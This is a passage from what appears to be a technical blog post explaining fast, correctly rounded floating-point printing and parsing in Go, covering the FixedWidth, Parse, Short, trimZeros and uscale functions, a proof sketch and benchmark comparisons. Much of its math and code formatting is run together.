FixedWidth(f float64, n int) (d uint64, p int) {\n\tif n > 18 {\n\t\tpanic(\"too many digits\")\n\t}\n\tm, e := unpack64(f)\n\tp = n - 1 - log10Pow2(e+63)\n\tu := uscale(m, prescale(e, p, log2Pow10(p)))\n\td = u.round()\n\tif d >= uint64pow10[n] {\n\t\td, p = u.div(10).round(), p-1\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:96,110That’s the entire conversion!The code splitsfintom,e;\ncomputespas just described;\nand then usesuscaleandroundto computed=f·10p.\nIf the result has an extra digit,\neither because our approximate log madeptoo big,\nor because of rollover during rounding,\nwe divide the unrounded form by 10, round again, and updatep.\nWhen we approximatedlog2mby counting bits,\nwe used the exact log of the greatest power of two less than or equal tom,\nso the computeddmust be less than twice the intended limit10n,\nmeaning the leading digit (if there are too many digits) must be 1.\nAnd rollover only happens for ‘999...’,\nso it is not possible to have both an extra digit and rollover.As an example conversion,\nconsider a float64 approximation ofπ(0x1921fb54442d18·2−51) to 15 decimal digits.\nWe havee=−51,n=15, andbits(m)=53,\nsop=n−1−⌊(log102)·(e+bits(m)−1)⌋=14.The2−51and10−14scales align like this:Thenuscale(0x1921fb54442d18,−51,14)returns the unrounded number ‘314159265358979.0+’,\nwhich rounds to 314159265358979.\nOur answer is then314159265358979·10−14.Parsing DecimalsUnrounded scaling also lets us parse decimal representations of floating-point numbers efficiently.\nLet’s assume we’ve taken care of parsing a string like ‘1.23e45’\nand now have an integer and exponent liked=123,p=45−2=43.\nTo convertd·10pto a float64,\nwe can choose an appropriateeso thatd·2e·10p∈[252,253)and then return[uscale(d,e,p)]·2−e.The derivation ofeis similar to the derivation ofpfor printing:d·2e·10p∈[252,253)d·2e·10p∈252·[1,2)[factoringrange](log2d·10p)+e∈52+[0,1)[takinglog]e∈52−(log2d·10p)+[0,1)[isolatinge]e∈52−((log2d·10p)−[0,1))[regrouping]e=52−⌊log2d·10p⌋[pisaninteger]e=52−⌊(log2d)+(log210)·p⌋[changinglogbase]Once again, it is okay to overestimatee, so we can approximatelog2d=bits(d)−1, yieldinge=53−bits(d)−⌊(log210)·p⌋.\nIfeis very large,−ewill be very small,\nmeaning we will be creating a subnormal,\nso we need to round to a smaller number of bits.\nTo handle this, we capeat 1074,\nwhich caps−eat−1074.\nAs before, due to the approximation oflog2d, the scaled result is at most twice as large as our target,\nmeaning it might have one extra bit to shift away.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\te := min(1074, 53-b-log2Pow10(p))\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, log2Pow10(p)))\n\tm := u.round()\n\tif m >= 1<<53 {\n\t\tm, e = u.rsh(1).round(), e-1\n\t}\n\treturn pack64(m, -e)\n}fpfmt/unopt/fpfmt.go:111,125FixedWidthandParsedemonstrate\nexactly how similar printing and parsing really are.\nIn printing, we are givenm,eand\nfindp; thenuscale(m,e,p)converts binary to decimal.\nIn parsing, we are givend,pand finde;\nthenuscale(d,e,p)converts decimal to binary.We can make parsing a little faster with a few hand optimizations.\nThis optimized version introduceslpto avoid callinglog2Pow10twice,\nand it implements the extra digit handling in branch-free code.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\tlp := log2Pow10(p)\n\te := min(1074, 53-b-lp)\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, lp))// This block is branch-free code for://\tif u.round() >= 1<<53 {//\t\tu = u.rsh(1)//\t\te = e - 1//\t}s := bool2[int](u >= unmin(1<<53))\n\tu = (u >> s) | u&1\n\te = e - s\n\n\treturn pack64(u.round(), -e)\n}// unmin returns the minimum unrounded that rounds to x.func unmin(x uint64) unrounded {\n\treturn unrounded(x<<2 - 2)\n}fpfmt/fpfmt.go:112,138Now we are ready for our next challenge: shortest-width printing.Shortest-Width PrintingShortest-width printing means to prepare a decimal representation\nthat a floating-point parser would convert back to the exact samefloat64,\nusing as few digits as possible.\nWhen there are multiple possible shortest decimal outputs,\nwe insist on the one that is nearest the original input,\nnamely the correctly-rounded one.\nIn general, 17 digits are always enough to uniquely identify afloat64,\nbut sometimes fewer can be used, even down to a single digit in numbers like 1, 2e10, and 3e−42.An obvious approach would be to useFixedPrintfor increasing values ofn,\nstopping whenParse(FixedPrint(f, n)) == f.\nOr maybe we should derive an equation fornand then useFixedPrint(f, n)directly.\nSurprisingly, neither approach works:Short(f)is not necessarilyFixedPrint(f, n)for somen.\nThe simplest demonstration of this isf=289=618970019642690137449562112=0x10000000000000·237,\nwhich looks like this:Becausefis a power of two, the floating-point exponent\nchanges atf,\nas does the spacing between floating-point numbers.\nThe next smallest value is0x1ffffffffffff·2−38,\nmarked on the diagram as0xffffffffffff½·2−37.\nThe dotted lines mark the halfway points betweenfand its nearest floating point neighbors.\nThe accurate decimal answers are those at or between the dotted lines,\nall of which convert back tof.The correct rounding offto 16 digits ends in …901: the next digit infis 3,\nso we should round down.\nHowever, because of the spacing change aroundf,\nthat correct decimal rounding does not convert back tof.\nAFixedPrintloop would choose a 17-digit form instead.\nBut there is an accurate 16-digit form, namely …902.\nThat decimal is closer tofthan it is to any other float64,\nmaking it an accurated.\nAnd since the closer 16-digit value …901 is not an accurated,Shortshould use …902 instead.Assuming as usual thatf=m·2e,\nlet’s definefootprint(f)to be the distance between the midpoints fromfto its\nfloating-point neighbors.\nNormally those neighbors are2ein either direction—the midpoints are(m±½)·2e—sofootprint(f)=2e.\nAt a power of two with an exponent change,\nthe lower midpoint is instead(m−¼)·2e,\nsofootprint(f)=¾·2e.\nThe rounding paradox can only happen for powers of two\nwith this kind of skewed footprint.All that is to say we cannot useFixedWidthwith “the rightn”.\nBut we can use scale directly with “the rightp.”\nSpecifically, we can compute the midpoints betweenfand its floating-point neighbors\nand scale them to obtain the\nminimum and maximum valid choices ford.\nThen we can make the best choice:If one of the validdends in 0, use it after removing trailing zeros.(Choosing the rightpwill allow at most ten consecutive integers,\nso at most will one end in 0.)If there is only one validd, use it.Otherwise there are at least two validd, at least one on each side off;\nuse the correctly rounded one.Here is an example of the first case: one of the validdends in zero.We already saw an example of the second case: only one validd.\nFor numbers with symmetric footprints, that will be the\ncorrectly roundedd.\nAs we saw for numbers with skewed footprints,\nthat may not be the correctly roundedd,\nbut it is still the correct answer.Finally, here is an example of the third case: multiple validd,\nbut none that end in zero.\nNow we should use the correctly rounded one.This sounds great, but how do we determine the rightp?\nWe wantfootprint(f)to allow at least one decimal integer,\nbut at most ten, meaning1≤footprint(f)<10.\nLuckily, we can hit that target exactly.For a symmetric footprint:footprint(f)·10p∈[1,10)2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/2e)·[1,10)[isolatingp]p∈−(log102)·e+[0,1)[takinglog]p∈−((log102)·e−[0,1))[regrouping]p=−⌊(log102)·e⌋[pisaninteger]For a skewed footprint:footprint(f)·10p∈[1,10)¾·2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/(¾·2e))·[1,10)[isolatingp]p∈−(log10¾+(log102)·e)+[0,1)[takinglog]p∈−(log10¾+(log102)·e−[0,1))[regrouping]p=−⌊log10¾+(log102)·e⌋[pisaninteger]For the symmetric footprint, we can uselog10Pow2,\nbut for the skewed footprint, we need a new approximation:// skewed computes the skewed footprint of m * 2**e,// which is ⌊log₁₀ 3/4 * 2**e⌋ = ⌊e*(log₁₀ 2)-(log₁₀ 4/3)⌋.func skewed(e int) int {\n\treturn (e*631305 - 261663) >> 21\n}fpfmt/fpfmt.go:234,238We should worry about a footprint with decimal width exactly 1,\nsince iffhad an odd mantissa,\nthe midpoints would be excluded.\nIn that case, if the decimals were the exact midpoints,\nthere would be no decimal between them,\nmaking the conversion invalid.\nBut it turns out we should not worry too much.\nFor a skewed footprint,¾·2e·10pcan never be exactly 1,\nbecause nothing can divide away the 3.\nFor a symmetric footprint,2e·10p=1can only happen fore=p=0,\nbut then scaling is a no-op,\nso that the decimal integers are exactly the binary integers.\nThe non-integer midpoints map to non-integer decimals.When we compute the decimal equivalents of the midpoints,\nwe will use ceiling and floor instead of rounding them,\nto make sure the integer results are valid decimal answers.\nIf the mantissamis odd, we will nudge the unrounded forms\ninward slightly before taking the ceiling or floor,\nsince rounding will be away fromm.The Go code is:// Short computes the shortest formatting of f,// using as few digits as possible that will still round trip// back to the original float64.func Short(f float64) (d uint64, p int) {\n\tconst minExp = -1085\n\n\tm, e := unpack64(f)\n\n\tvar min uint64\n\tz := 11// extra zero bits at bottom of m; 11 for 53-bit mif m == 1<<63 && e > minExp {\n\t\tp = -skewed(e + z)\n\t\tmin = m - 1<<(z-2)// min = m - 1/4 * 2**(e+z)} else {\n\t\tif e < minExp {\n\t\t\tz = 11 + (minExp - e)\n\t\t}\n\t\tp = -log10Pow2(e + z)\n\t\tmin = m - 1<<(z-1)// min = m - 1/2 * 2**(e+z)}\n\tmax := m + 1<<(z-1)// max = m + 1/2 * 2**(e+z)odd := int(m>>z) & 1\n\n\tpre := prescale(e, p, log2Pow10(p))\n\tdmin := uscale(min, pre).nudge(+odd).ceil()\n\tdmax := uscale(max, pre).nudge(-odd).floor()\n\n\tif d = dmax / 10; d*10 >= dmin {\n\t\treturn trimZeros(d, -(p - 1))\n\t}\n\tif d = dmin; d < dmax {\n\t\td = uscale(m, pre).round()\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:198,232Notice that this algorithm requires either two or three calls touscale.\nWhen the number being printed has only one valid representation\nof the shortest length, we avoid the third call touscale.\nAlso notice that theprescaleresult is shared by all three calls.Whenm=263,min<263,\nmeaning it won’t be left shifted as far as possible\nduring the call touscale.\nAlthough we could detect this case and calluscalewith2·minande−1,\nusingminunmodified is fine:\nit is still shifted enough that the bitsuscaleneeds to return will stay in the high 64 bits of the 192-bit product,\nand using the sameelets us use the sameprescalework for all three calls.Trimming ZerosThetrimZerosfunction used inShortremoves any trailing zeros from its argument,\nupdating the decimal power. An unoptimized version is:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tif x%10 != 0 {\n\t\treturn x, p\n\t}\n\tx /= 10\n\tp += 1\n\n\tif x%100000000 == 0 {\n\t\tx /= 100000000\n\t\tp += 8\n\t}\n\tif x%10000 == 0 {\n\t\tx /= 10000\n\t\tp += 4\n\t}\n\tif x%100 == 0 {\n\t\tx /= 100\n\t\tp += 2\n\t}\n\tif x%10 == 0 {\n\t\tx /= 10\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/unopt/fpfmt.go:227,254The initial removal of a single zero gives an early return for\nthe common case of having no zeros.\nOtherwise, the code makes four additional checks that\ncollectively remove up to 16 more zeros.\nFor outputs with many zeros, these four checks run faster\nthan a loop removing one zero at a time.When compiling this code,\nthe Go compiler reduces the remainder checks to multiplications\nusing the following well-known optimization.\nAn exactuint64divisionx/cwherexmodc=0can be implemented byx·mwheremis theuint64multiplicative inverse ofc, meaningm·cmod264=1:\nSincecis also the multiplicative inverse ofm,x·mis\nlossless—all the exact multiples ofcmap to all of[0,(264−1)/c]—so\nthe non-multiples are forced to map to larger values.\nThis observation gives a quick test for whetherxis an exact multiple ofc:\ncheck whetherx·m≤(264−1)/c.Only oddchave multiplicative inverses modulo powers of two,\nso even divisors require more work.\nTo compute an exact divisionx/(c<<s),\nwe can use(x/c)>>sinstead.\nTo check for remainder, we need to check that those lowsbits are all zero before we shift them away.\nWe can merge that check with the range check by rotating those bits\ninto the high part instead of discarding them:\ncheck whetherx·m↻>s≤(264−1)/c,\nwhere↻>is right rotate.The Go compiler does this transformation automatically\nfor theifconditions intrimZeros,\nbut inside theifbodies, it does not reuse the\nexact quotient it just computed.\nI considered changing the compiler to recognize that pattern,\nbut instead I wrote out the remainder check by hand\nin the optimized version, allowing me to reuse the computed exact quotients:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tconst (\n\t\tmaxUint64 = ^uint64(0)\n\t\tinv5p8    = 0xc767074b22e90e21// inverse of 5**8inv5p4    = 0xd288ce703afb7e91// inverse of 5**4inv5p2    = 0x8f5c28f5c28f5c29// inverse of 5**2inv5      = 0xcccccccccccccccd// inverse of 5)// Cut 1 zero, or else return.if d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t} else {\n\t\treturn x, p\n\t}// Cut 8 zeros, then 4, then 2, then 1.if d := bits.RotateLeft64(x*inv5p8, -8); d <= maxUint64/100000000 {\n\t\tx = d\n\t\tp += 8\n\t}\n\tif d := bits.RotateLeft64(x*inv5p4, -4); d <= maxUint64/10000 {\n\t\tx = d\n\t\tp += 4\n\t}\n\tif d := bits.RotateLeft64(x*inv5p2, -2); d <= maxUint64/100 {\n\t\tx = d\n\t\tp += 2\n\t}\n\tif d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/fpfmt.go:240,278This approach to trimming zeros is from Dragonbox.\nFor more about the general optimization,\nsee Warren’sHacker’s Delight[34],\nsections 10-16 and 10-17.Fast, Accurate ScalingThe conversion algorithms we examined are nice and simple.\nFor them to be fast,uscaleneeds to be fast while remaining correct.\nAlthough multiplication by2ecan be implemented by shifts,uscalecannot actually compute or multiply by10p—that would take too long whenpis a large positive or negative number.\nInstead, we can approximate10pas a floating-point numberpm·2pewith a 128-bit mantissa,\nlooked up in a table indexed byp.\nSpecifically, we will usepe=⌊log210p⌋−127andpm=⌈10p/2pe⌉,\nensuring thatpm∈[2127,2128).\nWe will write a separate program to generate this table.\nIt emits Go code definingpow10Min,pow10Max, andpow10Tab:pow10Tab[0]holds the entry forp=pow10Min.\nTo figure out how big the table needs to be,\nwe can analyze the three functions we just wrote.FixedWidthconverts floating-point to decimal.\nIt needs to calluscalewith a 53-bitx,e∈[−1137,960], andp∈[−307,341].Shortalso converts floating-point to decimal.\nIt needs to calluscalewith a 55-bitx,e∈[−1137,960], andp∈[−292,324].Parseconverts decimal to floating-point.\nIt needs to calluscalewith a 64-bitxandp∈[−343,289].\n(Outside that range ofp,Parsecan return 0 or infinity.)So the table needs to provide answers forp∈[−343,341].If10p≈pm·2pe, thenx·2e·10p≈x·pm·2e+pe.\nIn all of our algorithms, the result ofuscalewas always small—at most 64 bits.\nSincepmis 128 bits andx·pmis even bigger,e+pemust be negative,\nso this computation is(x*pm) >> -(e+pe).\nBecause of the ceiling,pmmay be too large by an errorε0<1,\nsox·pmmay be too large by an errorε1=x·ε0<x.\nTo round exactly, we care whether any of the shifted bits is 1,\nbutε1may change the lowbits(x)bits,\nso we can’t trust them.\nInstead, we will throw them away.\nand use only the upper bits to compute our unrounded number.\nThat is the entire idea!Now let’s look at the implementation.\nTheprescalefunction returns ascalerwithpmand a shift counts:// A scaler holds derived scaling constants for a given e, p pair.type scaler struct {\n\tpm pmHiLo\n\ts  int\n}// A pmHiLo represents hi<<64 + lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/unopt/fpfmt.go:256,266We want the shift count to reserve two extra bits for the unrounded\nrepresentation and to apply to the top 64-bit word of the 192-bit product,\nwhich gives this formula:s=−(e+pe)−2−(192−64)=−(e+⌊log210p⌋−127)−2−128=−(e+⌊log210p⌋+3)That translates directly to Go:// prescale returns the scaling constants for e, p.// lp must be log2Pow10(p).func prescale(e, p, lp int) scaler {\n\treturn scaler{pm: pow10Tab[p-pow10Min], s: -(e + lp + 3)}\n}fpfmt/fpfmt.go:292,296Inuscale, since the caller left-justifiedxto 64 bits,\ndiscarding the lowbits(x)bits means discarding the\nlowest 64 bits of the product, which we skip computing entirely.\nThen we use the middle 64-bit word and the lowsbits\nof the upper word to set the sticky bit in the result.// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\tmid, carry := bits.Add64(mid, mid2, 0)\n\thi += carry\n\tsticky := bool2[unrounded](mid != 0 || hi&((1<<c.s)-1) != 0)\n\treturn unrounded(hi>>c.s) | sticky\n}fpfmt/unopt/fpfmt.go:302,312It is mind-boggling that this works, but it does.\nOf course, you shouldn’t take my word for it.\nWe have to prove it correct.Sketch of a Proof of Fast ScalingTo prove that our fastuscalealgorithm is correct,\nthere are three cases: small positivep,\nsmall negativep,\nand largep.\nThe actual proof, especially for largep,\nis non-trivial,\nand the details are quite a detour from\nour fast scaling implementations,\nso this section only sketches the basic ideas.\nFor the details, see the accompanying post, “Fast Unrounded Scaling: Proof by Ivy.”Remember from the previous section thatpm=⌈10p/2pe⌉=10p/2pe+ε0for someε0<1.\nSince10p=5p·2p,pm’s 128 bits need only represent the5ppart; the2pcan always be handled bype.Forp∈[0,27),5pfits in the top 64 bits of the 128-bitpm.\nSincepmis exact,\nthe only possible error is introduced by discarding the bottombits(x)bits.\nSince the bottom 64 bits ofpmare zero,\nthe bits we discard are all zero.\nSouscaleis correct for small positivep.Forp∈[−27,−1],x·pmis approximating division by5−p(remember that−pis a positive number!).\nThe 128-bit approximation is precise enough that whenxis a\nmultiple of5−p, only the lowestbits(x)bits are non-zero;\ndiscarding them keeps the unrounded form exact.\nAnd whenxis not a multiple of5−p,\nthe result has a fractional part that must be at least1/5−paway from an integer.\nThat fractional separation is much larger than the maximum error in the product,\nso the high bits saved in the unrounded form are correct;\nthe fraction is also repeating, so that there is guaranteed\nto be a 1 bit to cause the unrounded form to be marked inexact.\nSouscaleis correct for small negativep.Finally, we must handle largep, which always have a non-zero error\nand therefore should always return unrounded numbers marked inexact\n(with the sticky bit set to 1).\nConsider the effect of adding a small error to the idealized “correct”x·10p/2pe,\nproducingx·pm.\nThe error is at most 64 bits.\nAdding that error to the 192-bit product can certainly affect\nthe low 64 bits, and it may also generate a carry out of the low 64\ninto the middle 64 bits.\nThe carry turns 1 bits into 0 bits from right to left\nuntil it hits a 0 bit;\nthat first 0 bit becomes a 1, and the carry stops.\nThe key insight is that seeing a 1 in the middle bits\nis proof that the carry did not reach the high bits,\nso the high bits are correct.\n(Seeing a 1 in the middle bits also ensures that\nthe unrounded form is marked inexact, as it must be,\neven though we discarded the low bits.)\nUsing a program backed by careful math, we can analyze all thepmin our table,\nshowing that every possiblex·pmhas a 1 in the middle bits.\nSouscaleis correct for largep.Omit Needless MultiplicationsWe have a fast and correctuscale, but we can make it faster\nnow that we understand the importance of carry bits.\nThe idea is to compute the high 64 bits of the product\nand then use it directly whenever possible, avoiding the computation\nof the remaining 64 bits at all.\nTo make this work, we need the high 64 bits to be rounded up,\na ceiling instead of a floor.\nSo we will change thepmHiLofrom representinghi·264+lotohi·264−lo.// A pmHiLo represents hi<<64 - lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/fpfmt.go:280,284The exact computation using this form would be:hi, mid := bits.Mul64(x, c.pm.hi)\nmid2, lo := bits.Mul64(x, c.pm.lo)\nmid, carry := bits.Sub64(mid, mid2, bool2[uint64](lo > 0))\nhi -= carry\nreturn unrounded(hi >> c.s) | bool2[unrounded](hi&((1<<c.s)-1) != 0 || mid != 0)The 128-bit productx·pm.hicomputed on the first line\nmay be too big by an error of up to264,\nwhich may or may not affect the high 64 bits;\nThe middle three lines correct the product,\npossibly subtracting 1 fromhi.\nLike in the proof sketch, if any of the bottomsbits of the approximatehiis a 1 bit,\nthat 1 bit would stop the subtracted carry from\naffecting the higher bits, indicating that we don’t need to correct the product.Using this insight, the optimizeduscaleis:// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tsticky := uint64(1)\n\tif hi&(1<<(c.s&63)-1) == 0 {\n\t\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\t\tsticky = bool2[uint64](mid-mid2 > 1)\n\t\thi -= bool2[uint64](mid < mid2)\n\t}\n\treturn unrounded(hi>>c.s | sticky)\n}fpfmt/fpfmt.go:298,310The fix-up looks different from the exact computation above\nbut it has the same effect.\nWe don’t need the actual final value ofmid, only the carry\nand its effect on the sticky bit.On some systems, notably x86-64,bits.Mul64computes both results in a single instruction.\nOn other systems, notably ARM64,bits.Mul64must use two different instructions;\nit helps on those systems to write the code this way,\noptimizing away the computation for the low half ofx·pm.lo.The more bits that are being shifted out ofhi,\nthe more likely it is that a 1 bit is being shifted out,\nso that we have an answer after only the firstbits.Mul64.\nWhenShortcallsuscale, it passes twoxthat\ndiffer only in a single bit\nand multiplies them by the samepm.hi.\nWhile one of them might clear the lowsbits ofhi,\nthe other is unlikely to also clear them,\nso we are likely to hit the fast path at least once,\nif not twice.\nIn the case whereShortcallsuscalethree times,\nwe are likely to hit the fast path at least twice.\nThis optimization means that, most of the time, auscaleis implemented by a single wide multiply.\nThis is the main reason thatShortruns faster than\nRyū, Schubfach, and Dragonbox, as we will see in the next section.PerformanceI promised these algorithms would be simpleandfast.\nI hope you are convinced about simple.\n(If not, keep in mind that the implementations in widespread\nuse today are far more complicated!)\nNow it is time to evaluate ‘fast’\nby comparing against other implementations.\nAll the other implementations are written in C or C++ and compiled by a C/C++ compiler.\nTo isolate compilation differences,\nI translated the Go code to C and measured\nboth the Go code and the C translation.I ran the benchmarks on two systems.Apple M4 (2025 MacBook Air ‘Mac16,12’), 32 GB RAM, macOS 26.1, Apple clang 17.0.0 (clang-1700.6.3.2)AMD Ryzen 9 7950X, 128 GB RAM, Linux 6.17.9 and libc6 2.39-0ubuntu8.6, Ubuntu clang 18.1.3 (1ubuntu1)Both systems used Go 1.26rc1.\nThe full benchmark code is in thersc.io/fpfmtpackage.Printing TextReal implementations generate strings, so we need to write\ncode to convert the integers we have been returning into digit sequences,\nlike this:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tfor nd := len(a) - 1; nd >= 0; nd-- {\n\t\ta[nd] = byte(u%10 + '0')\n\t\tu /= 10\n\t}\n}fpfmt/unopt/fpfmt.go:368,376Unfortunately, if we connect our fastFixedWidthandShortto this\nversion offormatBase10, benchmarks spend most of their time in the formatting loop.\nThere are a variety of clever ways to speed up digit formatting.\nFor our purposes, it suffices to use the old trick of\nsplitting the number into two-digit chunks and\nthen converting each chunk by\nindexing a 200-byte lookup table (more precisely, a “lookup string”) of all 2-digit values from 00 to 99:// i2a is the formatting of 00..99 concatenated,// a lookup table for formatting [0, 99].const i2a = \"00010203040506070809\" +\n\t\"10111213141516171819\" +\n\t\"20212223242526272829\" +\n\t\"30313233343536373839\" +\n\t\"40414243444546474849\" +\n\t\"50515253545556575859\" +\n\t\"60616263646566676869\" +\n\t\"70717273747576777879\" +\n\t\"80818283848586878889\" +\n\t\"90919293949596979899\"fpfmt/fpfmt.go:353,364Using this table and unrolling the loop to allow the\ncompiler to optimize away bounds checks, we end up withformatBase10:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tnd := len(a)\n\tfor nd >= 8 {// Format last 8 digits (4 pairs).x3210 := uint32(u % 1e8)\n\t\tu /= 1e8\n\t\tx32, x10 := x3210/1e4, x3210%1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\tx3, x2 := (x32/100)*2, (x32%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\ta[nd-5], a[nd-6] = i2a[x2+1], i2a[x2]\n\t\ta[nd-7], a[nd-8] = i2a[x3+1], i2a[x3]\n\t\tnd -= 8\n\t}\n\n\tx := uint32(u)\n\tif nd >= 4 {// Format last 4 digits (2 pairs).x10 := x % 1e4\n\t\tx /= 1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\tnd -= 4\n\t}\n\tif nd >= 2 {// Format last 2 digits.x0 := (x % 1e2) * 2\n\t\tx /= 1e2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\tnd -= 2\n\t}\n\tif nd > 0 {// Format final digit.a[0] = byte('0' + x)\n\t}\n}fpfmt/fpfmt.go:366,406This is more code than I’d prefer, but it is at least straightforward.\nI’ve seen much more complex versions.WithformatBase10, we can buildFmt, which formats in standard exponential notation:// Fmt formats d, p into s in exponential notation.// The caller must pass nd set to the number of digits in d.// It returns the number of bytes written to s.func Fmt(s []byte, d uint64, p, nd int) int {// Put digits into s, leaving room for decimal point.formatBase10(s[1:nd+1], d)\n\tp += nd - 1// Move first digit up and insert decimal point.s[0] = s[1]\n\tn := nd\n\tif n > 1 {\n\t\ts[1] = '.'\n\t\tn++\n\t}// Add 2- or 3-digit exponent.s[n] = 'e'\n\tif p < 0 {\n\t\ts[n+1] = '-'\n\t\tp = -p\n\t} else {\n\t\ts[n+1] = '+'\n\t}\n\tif p < 100 {\n\t\ts[n+2] = i2a[p*2]\n\t\ts[n+3] = i2a[p*2+1]\n\t\treturn n + 4\n\t}\n\ts[n+2] = byte('0' + p/100)\n\ts[n+3] = i2a[(p%100)*2]\n\ts[n+4] = i2a[(p%100)*2+1]\n\treturn n + 5\n}fpfmt/fpfmt.go:312,345When callingFmtwith aFixedWidthresult, we know the digit countndalready.\nFor aShortresult, we can compute the digit count easily from the bit length:// Digits returns the number of decimal digits in d.func Digits(d uint64) int {\n\tnd := log10Pow2(bits.Len64(d))\n\treturn nd + bool2[int](d >= uint64pow10[nd])\n}fpfmt/fpfmt.go:347,351Fixed-Width PerformanceTo evaluate fixed-width printing,\nwe need to decide which floating-point values to convert.\nI generated 10,000 uint64s in the range[1,263−252)and used them as\nfloat64 bit patterns.\nThe limited range avoids negative numbers, infinities, and NaNs.\nThe benchmarks all use Go’sChaCha8-based generatorwith a fixed seed for reproducibility.\nTo reduce timing overhead, the benchmark builds an array of 1000 copies of the value\nand calls a function that converts every value in the array in sequence.\nTo reduce noise, the benchmark times that function call 25 times and uses the median timing.\nWe also have to decide how many digits to ask for:\nlonger sequences are more difficult.\nAlthough I investigated a wider range, in this post I’ll show\ntwo representative widths: 6 digits (Cprintf’s default) and 17 digits\n(the minimum to guarantee accurate round trips, so widely used).The implementations I timed are:dblconv: Loitsch’sdouble-conversion library, using theToExponentialfunction.\nThis library, used in Google Chrome,\nimplements a handful of special cases for small binary exponents\nand falls back to a bignum-based printer for larger exponents.dmg1997: Gay’sdtoa.c,archived in 1997.\nFor our purposes, this represents Gay’s original C implementation\ndescribed in his technical report from 1990  [11].\nI confirmed that this 1997 snapshot runs at the same speed as\n(and has no significant code changes compared to)\nanother copy dating back to May 1991 or earlier.dmg2017: Gay’sdtoa.c,archived in 2017.\nIn 2017, Gay published an updated version ofdtoa.cthat usesuint64math and\na table of 96-bit powers of ten. It is significantly faster than the original version (see below).\nIn November 2025, I confirmed that the latest version runs at the same speed as this one.libc:\nThe C standard library conversion usingsprintf(\"%.*e\", prec-1).\nThe conversion algorithm varies by C library.\nThe macOS C library seems to wrap a pre-2017 version ofdtoa.c,\nwhile Linux’s glibc uses its own bignum-based code.\nIn general the C library implementations have not kept pace\nwith recent algorithms and are slower than any of the others.ryu: Adams’sRyū library, using thed2exp_bufferedfunction.\nIt uses the Ryū Printf algorithm [3].uscale: The unrounded scaling approach, using the Go code in this post.uscalec: A C translation of the unrounded scaling Go code.Here is a scatterplot showing the times required to formatfto 17 digits,\nrunning on the Linux system:(Click on any of the graphs in this post for a larger view.)The X axis is the log of the floating point inputf,\nand\nthe Y axis is the time required for a single conversion of the given input.\nThe scatterplot makes many things clear. For example, it is obvious that\nthere are two kinds of implementations.\nThose that use bignums take longer for large exponents and\nhave a “winged” scatterplot,\nwhile those that avoid bignums run at a mostly constant speed across\nthe entire exponent range.\nThe scatterplot also highlights many interesting data-dependent patterns in the timings,\nmost of which I have not investigated.\nA friend remarked that you could probably spend a whole career\nanalyzing the patterns in this one plot.For our purposes, it would help to have a clearer comparison\nof the speed of the different algorithms.\nThe right tool for that is a plot of the cumulative distribution function (CDF),\nwhich looks like this:Now time is on the X axis (still log scale), and the Y axis plots what\nfraction of the inputs ran in that time or less.\nFor example, we can see that dblconv’s fast path applies to most inputs,\nbut its slow path is much slower than Linux glibc or\neven Gay’s original C library.The CDF only plots the middle 99.9% of timings\n(dropping the 0.05% fastest and slowest),\nto avoid tails caused by measurement noise.\nIn general, measurements are noisier on the Mac because\nARM64 timers only provide ~20ns precision,\ncompared to the x86’s sub-nanosecond precision.Here are the scatterplots and CDFs for 6-digit output on the two systems: Using a smaller scaling factor increases precision\nat the cost of larger mantissas.\nWhen representing very large numbers, we can use\nlarger scaling factors to reduce the mantissa size.\nFor example, here are various representations of\nnumbers around one billion:Floating-point numbers are the same as base-2 fixed-point numbers except thatechanges with\nthe overall size of the number.\nSmall numbers use very small scaling factors\nwhile large numbers use large scaling factors,\naiming to keep the mantissas a constant length.\nFor float64s, the exponenteis chosen so that the mantissamhas 53 